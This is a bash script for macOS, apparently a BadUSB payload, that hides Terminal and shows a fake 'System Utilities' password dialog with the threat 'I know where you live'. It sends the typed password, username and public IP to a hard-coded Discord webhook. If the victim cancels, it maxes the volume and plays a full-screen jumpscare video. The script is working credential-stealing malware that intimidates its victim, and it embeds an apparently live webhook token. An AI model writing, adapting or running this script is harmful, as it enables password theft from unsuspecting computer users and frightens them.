#!/bin/bash
# Combined Login Prompt with Jumpscare Fallback for macOS
# ----------------------------------------------------------------
# - Displays a login prompt:
#     "I know where you live, [FirstName]."
#     "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
# - If a non-empty password is entered, it sends the password, public IP,
#   and username to a Discord webhook using Python for JSON generation.
# - If the user cancels (or leaves the password empty), it downloads and plays
#   a jumpscare video (from GitHub) in the browser (full-screen, at max volume).
# - Finally, it force-kills Terminal.
#
# Requirements:
#   - macOS with osascript, curl, and either python3 or python2 installed.
#
# Usage:
#   chmod +x combined_script.sh
#   ./combined_script.sh

# --- Hide Terminal Immediately ---
osascript -e 'tell application "Terminal" to set visible of front window to false'

# --- Get Current Username ---
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

# --- Initialize Capture Data ---
capture="username=${username}\n____________________________________________\n\n"

# --- Define AppleScript Login Prompt (Single Attempt) ---
read -r -d '' applescriptCode <<'EOF'
set fullName to (long user name of (system info))
set firstName to word 1 of fullName
set lastName to word -1 of fullName
try
    set userPassword to text returned of (display dialog "I know where you live, " & firstName & "." & return & "Enter your password Mr. " & lastName & ". DO NOT PRESS CANCEL" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
    return userPassword
on error
    return ""
end try
EOF

# --- Execute the Login Prompt and Capture Output ---
osascript -e "$applescriptCode" > /tmp/pass_temp.txt
password=$(cat /tmp/pass_temp.txt)
rm /tmp/pass_temp.txt

# --- Branch Based on User Input ---
if [ -z "$password" ]; then
    # User canceled (or provided an empty password) – trigger jumpscare.
    echo "User canceled login prompt. Triggering jumpscare..."
    
    # --- Define the Jumpscare Video URL (GitHub Raw Link) ---
    VIDEO_URL="https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4"
    HTML_FILE="/tmp/jumpscare.html"
    
    # --- Create a Temporary HTML File that Embeds the Video ---
    cat <<EOF > "$HTML_FILE"
<html>
  <head>
    <meta charset="UTF-8">
    <title>JumpScare</title>
    <style>
      html, body {
        margin: 0;
        padding: 0;
        height: 100%;
        background-color: black;
      }
      video {
        width: 100%;
        height: 100%;
        object-fit: cover;
      }
    </style>
  </head>
  <body>
    <video id="video" autoplay>
      <source src="$VIDEO_URL" type="video/mp4">
      Your browser does not support the video tag.
    </video>
    <script>
      var video = document.getElementById('video');
      video.addEventListener('loadeddata', function() {
        setTimeout(function(){
          if (video.requestFullscreen) {
            video.requestFullscreen();
          } else if (video.webkitRequestFullscreen) {
            video.webkitRequestFullscreen();
          } else if (video.msRequestFullscreen) {
            video.msRequestFullscreen();
          }
        }, 500);
      });
    </script>
  </body>
</html>
EOF

    # --- Set System Volume to Maximum ---
    osascript -e 'set volume output volume 100'
    
    # --- Open the Temporary HTML File in the Default Browser ---
    open "$HTML_FILE"
    osascript -e 'display notification "JumpScare video playing in full screen." with title "JumpScare"'
    
    # --- Force Kill Terminal ---
    killall Terminal
    exit 0
else
    # User provided a password – proceed to capture and send data.
    echo "Password entered: $password"
    capture="${capture}password=${password}\n"
    
    # --- Retrieve Public IP Address ---
    ipaddress=$(curl -s https://api.ipify.org)
    capture="${capture}ipaddress=${ipaddress}"
    
    # --- Save Data to Temporary File ---
    echo -e "$capture" > /tmp/pass.txt

    # --- Determine Python Interpreter (Prefer python3, fallback to python2) ---
    if command -v python3 &>/dev/null; then
        PYTHON=python3
    elif command -v python2 &>/dev/null; then
        PYTHON=python2
    else
        echo "Neither Python3 nor Python2 is available. Exiting."
        exit 1
    fi
    
    # --- Generate JSON Payload using the selected Python interpreter ---
    payload=$($PYTHON -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < /tmp/pass.txt)
    
    # --- Send Payload to Discord Webhook ---
    DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
    curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"
    rm /tmp/pass.txt
    
    # --- Force Kill Terminal ---
    killall Terminal
    exit 0
fi
